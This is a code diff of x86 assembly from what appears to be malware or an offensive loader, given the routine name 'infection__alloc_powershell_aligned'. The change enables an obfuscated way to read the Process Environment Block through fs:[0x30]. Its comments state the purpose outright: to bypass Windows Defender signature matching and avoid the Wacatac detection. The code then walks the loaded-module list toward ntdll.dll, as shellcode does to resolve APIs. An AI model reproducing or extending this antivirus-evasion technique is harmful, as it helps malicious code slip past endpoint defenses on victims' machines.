@@ -81,11 +81,10 @@ infection__alloc_powershell_aligned:
    mov [ebp-0x10], esp
    mov [ebp-0x14], ecx
    
-   ;mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
-   ;inc eax                      ; I am convinced the Wacatac signature is just Microsoft telling us
-   ;neg eax                      ; we are performing a "whack attack" and we should git gud
-   ;mov eax, [fs:eax]            ; get current PEB (fs:0x30)
-   mov eax, [fs:0x30]
+   mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
+   inc eax                      ; I am convinced the Wacatac signature is just Microsoft telling us
+   neg eax                      ; we are performing a "whack attack" and we should git gud
+   mov eax, [fs:eax]            ; get current PEB (fs:0x30)
    mov ecx, [eax+0xC]           ; peb->Ldr
    mov eax, [ecx+0xC]           ; ldr->InLoadOrderModuleList.Flink (the current module)
    mov ecx, [eax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
